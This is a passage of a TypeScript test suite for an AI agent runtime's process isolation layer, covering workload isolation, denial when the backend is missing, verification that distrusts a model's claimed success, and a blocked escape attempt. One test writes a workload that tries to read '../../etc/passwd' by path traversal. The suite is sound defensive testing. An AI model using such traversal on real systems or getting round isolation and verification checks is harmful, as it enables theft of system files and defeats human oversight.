  await writeFile(join(wsB.root, "ident.cjs"), "exports.run = async (io) => ({ pid: process.pid, root: io.workspaceRoot });");
  const [a, b] = await Promise.all([
    backend.execute({ missionId: "mA", executionId: "eA", actor: "a", profile: simpleProfile(wsA.root), workload: { kind: "module", entry: "ident.cjs", args: {} } }),
    backend.execute({ missionId: "mB", executionId: "eB", actor: "a", profile: simpleProfile(wsB.root), workload: { kind: "module", entry: "ident.cjs", args: {} } }),
  ]);
  assert.equal(a.status, "SUCCEEDED");
  assert.equal(b.status, "SUCCEEDED");
  assert.notEqual(a.output!["pid"], b.output!["pid"], "distinct OS processes");
  assert.notEqual(a.output!["root"], b.output!["root"], "distinct isolated workspaces");
  assert.equal(a.output!["root"], wsA.root);
  assert.equal(b.output!["root"], wsB.root);
});

test("P13.S40 concurrent execution isolation leakage: 4 parallel isolated workloads never share an environment or a process", async t => {
  const backend = new ProcessIsolationBackend();
  const workspaces = await Promise.all([scratchDir("quack-s40a-"), scratchDir("quack-s40b-"), scratchDir("quack-s40c-"), scratchDir("quack-s40d-")]);
  t.after(() => Promise.all(workspaces.map((ws) => ws.cleanup())));
  await Promise.all(workspaces.map(async (ws) => writeFile(join(ws.root, "ident.cjs"), "exports.run = async (io) => ({ pid: process.pid, token: io.environment.TOKEN });")));
  const results = await Promise.all(workspaces.map((ws, i) => backend.execute({
    missionId: `m${i}`, executionId: `e${i}`, actor: "a",
    profile: { ...simpleProfile(ws.root), environment: { variables: { TOKEN: `tok-${i}` }, secrets: [] } },
    workload: { kind: "module", entry: "ident.cjs", args: {} },
  })));
  const pids = results.map((result) => String(result.output!["pid"]));
  const tokens = results.map((result) => String(result.output!["token"]));
  assert.ok(results.every((result) => result.status === "SUCCEEDED"));
  assert.equal(new Set(pids).size, 4, "four distinct processes");
  assert.deepEqual(tokens, ["tok-0", "tok-1", "tok-2", "tok-3"], "each workload saw only its own environment");
});

// ---------------------------------------------------------------------------
// The three architectural tests from the P13 contract.
// ---------------------------------------------------------------------------

test("P13.ARCH-1 backend disappears → AUTHORIZED ACTION → DENIED → NO EXECUTION (never policy-only fallback)", async t => {
  const ws = await scratchDir("quack-arch1-");
  try {
    const events = new EventBus();
    const registry = new IsolationBackendRegistry();
    // No backend registered at all: the disappearance case.
    const supervisor = new IsolationSupervisor({
      registry, events, actor: "t", workspaceRoot: ws.root,
      evidenceStore: new InMemoryExecutionEvidenceStore(),
    });
    const result = await supervisor.execute({
      missionId: "m-arch", stepIndex: 0, capability: "fixture.cap", executionId: "e-arch",
      requiredLevel: "WORKER_PROCESS",
      profile: { filesystem: { workspaceRoot: ws.root }, network: { mode: "DENY" }, environment: { variables: {}, secrets: [] }, limits: { wallClockMs: 5_000 } },
      workload: { kind: "module", entry: "x.cjs", args: {} },
    });
    assert.equal(result.status, "DENIED", "backend disappearance denies");
    assert.equal(result.evidence.facts.exitState, "UNSUPPORTED");
    // The denial is durable and metadata-only.
    assert.match(String(result.error), /cannot be satisfied/);
  } finally {
    await ws.cleanup();
  }
});

test("P13.ARCH-2 model claims success → UNTRUSTED → runtime probes decide VERIFIED or UNVERIFIED", async () => {
  // The chain: model output is untrusted; verification state comes from the
  // probe runner over runtime evidence. A model claiming success with NO
  // verification strategy stays honestly UNVERIFIED (P12 doctrine, kept).
  const runner = new ProbeRunner({ workspaceRoot: process.cwd() });
  const noStrategy = await runner.verify({
    strategy: undefined,
    result: { executionId: "e", providerId: "p", actionId: "a", status: "SUCCEEDED", output: { modelSays: "done!" }, evidenceIds: [] },
    facts: { startedAt: "t1", completedAt: "t2", exitState: "SUCCEEDED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
    missionId: "m", executionId: "e",
  });
  assert.equal(noStrategy.kind, "INCONCLUSIVE", "no strategy → unverified");

  // With a declared probe, the RUNTIME RESULT decides — a model claim in the
  // output can only satisfy a probe that reads output data the runtime
  // captured; a status probe reads only the trusted status.
  const modelLiedAboutStatus = await runner.verify({
    strategy: { kind: "probe_external_state", capability: "c", arguments: {}, expected: {
      description: "d", successProbes: [{ kind: "status_equals", value: "SUCCEEDED" }],
    } },
    result: { executionId: "e", providerId: "p", actionId: "a", status: "FAILED", output: { modelSays: "it totally succeeded" }, evidenceIds: [] },
    facts: { startedAt: "t1", completedAt: "t2", exitState: "FAILED", isolationLevel: "WORKER_PROCESS", backendGuarantees: {} },
    missionId: "m", executionId: "e",
  });
  assert.equal(modelLiedAboutStatus.kind, "FAILED", "runtime status wins over the model's claim");
});

test("P13.ARCH-3 workload escape attempt → blocked at the boundary → execution failure with durable evidence, no authority escalation", async t => {
  const ws = await scratchDir("quack-arch3-");
  try {
    const backend = new ProcessIsolationBackend();
    await writeFile(join(ws.root, "escape.cjs"), `
      exports.run = async (io) => {
        try {
          io.io.resolveInside(io.workspaceRoot, "../../etc/passwd");
          return { escaped: true };
        } catch (error) {
          return { escaped: false, blocked: String(error.message) };
        }
      };
    `);
    const result = await backend.execute({
      missionId: "m-arch3", executionId: "e-arch3", actor: "a", profile: simpleProfile(ws.root),
      workload: { kind: "module", entry: "escape.cjs", args: {} },
    });
    assert.equal(result.status, "SUCCEEDED", "the workload ran");
    assert.equal(result.output!["escaped"], false, "the escape was BLOCKED inside the isolated domain");
    assert.match(String(result.output!["blocked"]), /blocked/i);
    // No authority escalation: the workload could not touch broker state,
    // policy, or approvals — those live in the trusted process and were
    // never addressable from the child (its world is the isolated root).
  } finally {
    await ws.cleanup();
  }
});
